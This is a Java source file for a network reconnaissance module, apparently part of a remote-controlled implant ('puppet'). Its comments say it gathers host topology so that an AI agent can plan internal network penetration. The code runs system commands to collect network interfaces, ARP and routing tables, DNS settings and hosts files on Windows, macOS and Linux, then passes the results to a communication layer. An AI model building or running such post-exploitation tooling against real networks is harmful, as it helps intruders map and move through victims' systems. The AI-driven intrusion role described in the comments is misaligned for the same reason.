package org.leo.core.puppet.service;

import org.leo.core.net.Communication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;

import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 网络信息采集服务
 * <p>
 * 内联采集详细的网络拓扑信息，用于 AI agent 规划内网渗透路径：
 * - 网卡 IP/掩码/MAC/MTU（Java API，跨平台）
 * - ARP 表（Linux: /proc/net/arp 或 arp -a；Windows: arp -a）
 * - 路由表（Linux: /proc/net/route 或 route -n；Windows: route print）
 * - DNS 配置（Linux: /etc/resolv.conf；Windows: ipconfig /all）
 * - hosts 文件
 * - DNS 解析指定域名（InetAddress.getAllByName）
 */
public class NetworkInfoService extends ComponentService {

    private static final int OS_WINDOWS = 0;
    private static final int OS_MACOS   = 1;
    private static final int OS_LINUX   = 2;

    public NetworkInfoService(Communication communication,
                              List<RequestLayer> requestLayers,
                              List<ResponseLayer> responseLayers) {
        super(communication, requestLayers, responseLayers);
    }

    // ==================== public API ====================

    /** 一键采集全部网络信息（网卡、ARP、路由、DNS、hosts） */
    public Map<String, Object> collectAll() throws Exception {
        int osType = detectOS();
        Map<String, Object> networkInfo = new HashMap<String, Object>();

        safeCollect(networkInfo, "interfaces", "interfaces", osType);
        safeCollect(networkInfo, "arp",        "arp",        osType);
        safeCollect(networkInfo, "routes",     "routes",     osType);
        safeCollect(networkInfo, "dnsConfig",  "dnsConfig",  osType);
        safeCollect(networkInfo, "hosts",      "hosts",      osType);
        networkInfo.put("os", osType == OS_WINDOWS ? "Windows" : osType == OS_MACOS ? "macOS" : "Linux");

        Map<String, Object> result = new HashMap<String, Object>();
        result.put("code",        200);
        result.put("networkInfo", networkInfo);
        return result;
    }

    /** 仅采集网卡信息 */
    public Map<String, Object> collectInterfaces() throws Exception {
        Map<String, Object> result      = new HashMap<String, Object>();
        Map<String, Object> networkInfo = new HashMap<String, Object>();
        networkInfo.put("interfaces", doCollectInterfaces());
        result.put("code",        200);
        result.put("networkInfo", networkInfo);
        return result;
    }

    /** 仅采集 ARP 表 */
    public Map<String, Object> collectArp() throws Exception {
        int osType = detectOS();
        Map<String, Object> result      = new HashMap<String, Object>();
        Map<String, Object> networkInfo = new HashMap<String, Object>();
        networkInfo.put("arp", doCollectArp(osType));
        result.put("code",        200);
        result.put("networkInfo", networkInfo);
        return result;
    }

    /** 仅采集路由表 */
    public Map<String, Object> collectRoutes() throws Exception {
        int osType = detectOS();
        Map<String, Object> result      = new HashMap<String, Object>();
        Map<String, Object> networkInfo = new HashMap<String, Object>();
        networkInfo.put("routes", doCollectRoutes(osType));
        result.put("code",        200);
        result.put("networkInfo", networkInfo);
        return result;
    }

    /** 仅采集 DNS 配置 */
    public Map<String, Object> collectDnsConfig() throws Exception {
        int osType = detectOS();
        Map<String, Object> result      = new HashMap<String, Object>();
        Map<String, Object> networkInfo = new HashMap<String, Object>();
        networkInfo.put("dnsConfig", doCollectDnsConfig(osType));
        result.put("code",        200);
        result.put("networkInfo", networkInfo);
        return result;
    }

    /** 仅采集 hosts 文件 */
    public Map<String, Object> collectHosts() throws Exception {
        int osType = detectOS();
        Map<String, Object> result      = new HashMap<String, Object>();
        Map<String, Object> networkInfo = new HashMap<String, Object>();
        networkInfo.put("hosts", doCollectHosts(osType));
        result.put("code",        200);
        result.put("networkInfo", networkInfo);
        return result;
    }

    /** DNS 解析指定域名 */
    public Map<String, Object> resolveDns(String hostname) throws Exception {
        Map<String, Object> result = new HashMap<String, Object>();
        if (hostname == null || hostname.trim().isEmpty()) {
            result.put("code", 400);
            result.put("msg",  "hostname is required");
            return result;
        }
        Map<String, Object> networkInfo = new HashMap<String, Object>();
        networkInfo.put("resolved", doResolveDns(hostname.trim()));
        result.put("code",        200);
        result.put("networkInfo", networkInfo);
        return result;
    }

    // ==================== OS detection ====================

    private int detectOS() throws Exception {
        String out = execFast("uname -s 2>/dev/null || echo Windows").trim();
        if (out.startsWith("Windows") || out.isEmpty()) return OS_WINDOWS;
        if ("Darwin".equals(out)) return OS_MACOS;
        return OS_LINUX;
    }

    // ==================== collectAll helper ====================

    private void safeCollect(Map<String, Object> target, String key,
                             String opName, int osType) {
        try {
            Object value;
            if ("interfaces".equals(opName)) {
                value = doCollectInterfaces();
            } else if ("arp".equals(opName)) {
                value = doCollectArp(osType);
            } else if ("routes".equals(opName)) {
                value = doCollectRoutes(osType);
            } else if ("dnsConfig".equals(opName)) {
                value = doCollectDnsConfig(osType);
            } else {
                value = doCollectHosts(osType);
            }
            if (value != null) target.put(key, value);
        } catch (Exception e) {
            Map<String, Object> err = new HashMap<String, Object>();
            err.put("error", e.getClass().getName() + ": " + e.getMessage());
            target.put(key, err);
        }
    }

    // ==================== 1. 网卡信息（Java API，跨平台）====================

    private List<Map<String, Object>> doCollectInterfaces() throws Exception {
        List<Map<String, Object>> result = new ArrayList<Map<String, Object>>();
        Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
        if (ifaces == null) return result;

        while (ifaces.hasMoreElements()) {
            NetworkInterface iface = ifaces.nextElement();
            Map<String, Object> info = new HashMap<String, Object>();
            info.put("name",        iface.getName());
            info.put("displayName", iface.getDisplayName());
            info.put("up",          iface.isUp());
            info.put("loopback",    iface.isLoopback());
            info.put("virtual",     iface.isVirtual());

            try { info.put("mtu", iface.getMTU()); } catch (Exception ignored) {}

            // MAC 地址
            try {
                byte[] mac = iface.getHardwareAddress();
                if (mac != null) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < mac.length; i++) {
                        if (i > 0) sb.append(":");
                        String hex = Integer.toHexString(mac[i] & 0xFF);
                        if (hex.length() == 1) sb.append("0");
                        sb.append(hex);
                    }
                    info.put("mac", sb.toString());
                }
            } catch (Exception ignored) {}

            // IP 地址列表
            List<Map<String, Object>> addresses = new ArrayList<Map<String, Object>>();
            Enumeration<InetAddress> addrs = iface.getInetAddresses();
            while (addrs.hasMoreElements()) {
                InetAddress addr = addrs.nextElement();
                Map<String, Object> addrInfo = new HashMap<String, Object>();
                addrInfo.put("address",  addr.getHostAddress());
                addrInfo.put("hostname", addr.getHostName());
                if (addr instanceof Inet4Address) {
                    addrInfo.put("type", "IPv4");
                } else if (addr instanceof Inet6Address) {
                    addrInfo.put("type", "IPv6");
                }
                addrInfo.put("loopback",  addr.isLoopbackAddress());
                addrInfo.put("siteLocal", addr.isSiteLocalAddress());
                addrInfo.put("linkLocal", addr.isLinkLocalAddress());
                addresses.add(addrInfo);
            }
            info.put("addresses", addresses);

            // 子接口
            Enumeration<NetworkInterface> subs = iface.getSubInterfaces();
            if (subs != null && subs.hasMoreElements()) {
                List<String> subNames = new ArrayList<String>();
                while (subs.hasMoreElements()) subNames.add(subs.nextElement().getName());
                info.put("subInterfaces", subNames);
            }

            // 跳过无地址且已 down 的接口
            if (addresses.isEmpty() && !iface.isUp()) continue;
            result.add(info);
        }
        return result;
    }

    // ==================== 2. ARP 表 ====================

    private Map<String, Object> doCollectArp(int osType) throws Exception {
        Map<String, Object> result = new HashMap<String, Object>();

        if (osType != OS_WINDOWS) {
            // Linux / macOS: 优先读 /proc/net/arp
            String procArp = execFast("cat /proc/net/arp 2>/dev/null");
            if (procArp != null && !procArp.trim().isEmpty()) {
                result.put("source",  "/proc/net/arp");
                result.put("entries", parseLinuxProcArp(procArp));
                return result;
            }
        }

        // 通用 fallback: arp -a
        String cmd    = osType == OS_WINDOWS ? winCmd("arp -a 2>nul") : "arp -a 2>/dev/null";
        String output = execFast(cmd);
        if (output != null) {
            result.put("source", "arp -a");
            result.put("raw",    truncate(output, 8192));
        }
        return result;
    }

    /**
     * 解析 /proc/net/arp:
     * IP address  HW type  Flags  HW address           Mask  Device
     */
    private List<Map<String, Object>> parseLinuxProcArp(String content) {
        List<Map<String, Object>> entries = new ArrayList<Map<String, Object>>();
        String[] lines = content.split("\n");
        for (int i = 1; i < lines.length; i++) { // skip header
            String line = lines[i].trim();
            if (line.isEmpty()) continue;
            String[] parts = line.split("\\s+");
            if (parts.length >= 6) {
                Map<String, Object> entry = new HashMap<String, Object>();
                entry.put("ip",     parts[0]);
                entry.put("hwType", parts[1]);
                entry.put("flags",  parts[2]);
                entry.put("mac",    parts[3]);
                entry.put("mask",   parts[4]);
                entry.put("device", parts[5]);
                entries.add(entry);
            }
        }
        return entries;
    }

    // ==================== 3. 路由表 ====================

    private Map<String, Object> doCollectRoutes(int osType) throws Exception {
        Map<String, Object> result = new HashMap<String, Object>();

        if (osType == OS_WINDOWS) {
            String output = execFast(winCmd("route print 2>nul"));
            if (output != null) {
                result.put("source", "route print");
                result.put("raw",    truncate(output, 16384));
            }
            return result;
        }

        // Linux: 优先 /proc/net/route
        String procRoute = execFast("cat /proc/net/route 2>/dev/null");
        if (procRoute != null && !procRoute.trim().isEmpty() && procRoute.contains("\n")) {
            result.put("source",  "/proc/net/route");
            result.put("entries", parseLinuxProcRoute(procRoute));
            return result;
        }

        // fallback: route -n (Linux) or netstat -rn (macOS)
        String cmd    = osType == OS_MACOS ? "netstat -rn 2>/dev/null" : "route -n 2>/dev/null";
        String output = execFast(cmd);
        if (output != null) {
            result.put("source", cmd.split(" ")[0]);
            result.put("raw",    truncate(output, 8192));
        }
        return result;
    }

    /**
     * 解析 /proc/net/route（十六进制小端字段）:
     * Iface  Destination  Gateway  Flags  RefCnt  Use  Metric  Mask  ...
     */
    private List<Map<String, Object>> parseLinuxProcRoute(String content) {
        List<Map<String, Object>> entries = new ArrayList<Map<String, Object>>();
        String[] lines = content.split("\n");
        for (int i = 1; i < lines.length; i++) {
            String line = lines[i].trim();
            if (line.isEmpty()) continue;
            String[] parts = line.split("\\s+");
            if (parts.length >= 8) {
                Map<String, Object> entry = new HashMap<String, Object>();
                entry.put("iface",       parts[0]);
                entry.put("destination", hexToIp(parts[1]));
                entry.put("gateway",     hexToIp(parts[2]));
                entry.put("flags",       parts[3]);
                entry.put("metric",      parts[6]);
                entry.put("mask",        hexToIp(parts[7]));
                entries.add(entry);
            }
        }
        return entries;
    }

    /** 十六进制小端 IP → 点分十进制 */
    private String hexToIp(String hex) {
        try {
            long val = Long.parseLong(hex, 16);
            return (val & 0xFF) + "."
                    + ((val >> 8)  & 0xFF) + "."
                    + ((val >> 16) & 0xFF) + "."
                    + ((val >> 24) & 0xFF);
        } catch (Exception e) {
            return hex;
        }
    }

    // ==================== 4. DNS 配置 ====================

    private Map<String, Object> doCollectDnsConfig(int osType) throws Exception {
        Map<String, Object> result = new HashMap<String, Object>();

        if (osType == OS_WINDOWS) {
            String output = execFast(winCmd("ipconfig /all 2>nul"));
            if (output != null) {
                result.put("source",      "ipconfig /all");
                result.put("nameservers", parseWindowsDns(output));
                result.put("raw",         truncate(extractDnsSection(output), 4096));
            }
            return result;
        }

        // Linux / macOS: /etc/resolv.conf
        String resolv = execFast("cat /etc/resolv.conf 2>/dev/null");
        if (resolv != null && !resolv.trim().isEmpty()) {
            result.put("source",      "/etc/resolv.conf");
            result.put("nameservers", parseResolvConf(resolv));
            result.put("raw",         truncate(resolv, 4096));
        }
        return result;
    }

    private List<String> parseResolvConf(String content) {
        List<String> servers = new ArrayList<String>();
        String[] lines = content.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String line = lines[i].trim();
            if (line.startsWith("nameserver")) {
                String[] parts = line.split("\\s+");
                if (parts.length >= 2) servers.add(parts[1]);
            }
        }
        return servers;
    }

    private List<String> parseWindowsDns(String output) {
        List<String> servers = new ArrayList<String>();
        String[]     lines   = output.split("\n");
        boolean      inDns   = false;
        for (int i = 0; i < lines.length; i++) {
            String line = lines[i].trim();
            if (line.contains("DNS Servers") || line.contains("DNS 服务器")) {
                int colon = line.indexOf(':');
                if (colon >= 0 && colon < line.length() - 1) {
                    String ip = line.substring(colon + 1).trim();
                    if (!ip.isEmpty()) servers.add(ip);
                }
                inDns = true;
            } else if (inDns) {
                if (!line.isEmpty() && line.matches("^[0-9a-fA-F.:]+$")) {
                    servers.add(line);
                } else {
                    inDns = false;
                }
            }
        }
        return servers;
    }

    private String extractDnsSection(String output) {
        StringBuilder sb    = new StringBuilder();
        String[]      lines = output.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String lower = lines[i].toLowerCase();
            if (lower.contains("dns") || lower.contains("domain") || lower.contains("suffix")) {
                sb.append(lines[i]).append("\n");
            }
        }
        return sb.toString();
    }

    // ==================== 5. hosts 文件 ====================

    private Map<String, Object> doCollectHosts(int osType) throws Exception {
        Map<String, Object> result = new HashMap<String, Object>();
        String content;

        if (osType == OS_WINDOWS) {
            String sysRoot = execFast(winCmd("echo %SystemRoot%")).trim();
            if (sysRoot.isEmpty() || sysRoot.contains("%")) sysRoot = "C:\\Windows";
            String path = sysRoot + "\\System32\\drivers\\etc\\hosts";
            result.put("path", path);
            content = execFast(winCmd("type \"" + path + "\" 2>nul"));
        } else {
            result.put("path", "/etc/hosts");
            content = execFast("cat /etc/hosts 2>/dev/null");
        }

        if (content != null && !content.trim().isEmpty()) {
            result.put("entries", parseHosts(content));
            result.put("raw",     truncate(content, 4096));
        } else {
            result.put("error", "cannot read file");
        }
        return result;
    }

    private List<Map<String, Object>> parseHosts(String content) {
        List<Map<String, Object>> entries = new ArrayList<Map<String, Object>>();
        String[] lines = content.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String line = lines[i].trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            int commentIdx = line.indexOf('#');
            if (commentIdx > 0) line = line.substring(0, commentIdx).trim();
            String[] parts = line.split("\\s+");
            if (parts.length >= 2) {
                Map<String, Object> entry = new HashMap<String, Object>();
                entry.put("ip", parts[0]);
                List<String> hostnames = new ArrayList<String>();
                for (int j = 1; j < parts.length; j++) hostnames.add(parts[j]);
                entry.put("hostnames", hostnames);
                entries.add(entry);
            }
        }
        return entries;
    }

    // ==================== 6. DNS 解析 ====================

    private List<Map<String, Object>> doResolveDns(String hostname) {
        List<Map<String, Object>> result = new ArrayList<Map<String, Object>>();
        try {
            InetAddress[] addrs = InetAddress.getAllByName(hostname);
            for (int i = 0; i < addrs.length; i++) {
                Map<String, Object> entry = new HashMap<String, Object>();
                entry.put("address",           addrs[i].getHostAddress());
                entry.put("canonicalHostName", addrs[i].getCanonicalHostName());
                if (addrs[i] instanceof Inet4Address) {
                    entry.put("type", "IPv4");
                } else if (addrs[i] instanceof Inet6Address) {
                    entry.put("type", "IPv6");
                }
                result.add(entry);
            }
        } catch (Exception e) {
            Map<String, Object> err = new HashMap<String, Object>();
            err.put("error", e.getClass().getName() + ": " + e.getMessage());
            result.add(err);
        }
        return result;
    }

    // ==================== helpers ====================

    private String truncate(String s, int maxLen) {
        if (s == null) return null;
        if (s.length() <= maxLen) return s;
        return s.substring(0, maxLen) + "\n... (truncated, total " + s.length() + " chars)";
    }
}
